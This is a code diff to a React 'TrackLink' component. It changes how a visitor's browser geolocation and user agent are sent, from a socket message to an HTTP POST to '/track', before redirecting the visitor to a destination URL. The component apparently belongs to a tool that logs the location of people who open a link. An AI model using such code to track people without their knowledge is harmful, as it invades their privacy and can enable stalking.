@@ -44,15 +44,20 @@ const TrackLink = () => {
         }
 
         navigator.geolocation.getCurrentPosition(
-            (position) => {
+            async (position) => {
                 const { latitude, longitude } = position.coords;
-                // Emit location to socket
-                socketRef.current.emit('update-location', {
-                    linkId: id,
-                    lat: latitude,
-                    lng: longitude,
-                    userAgent: navigator.userAgent
-                });
+
+                try {
+                    // Send tracking data via HTTP (Reliable)
+                    await api.post('/track', {
+                        linkId: id,
+                        lat: latitude,
+                        lng: longitude,
+                        userAgent: navigator.userAgent
+                    });
+                } catch (e) {
+                    console.error('Tracking failed', e);
+                }
 
                 // Redirect to destination
                 if (linkData?.destinationUrl) {
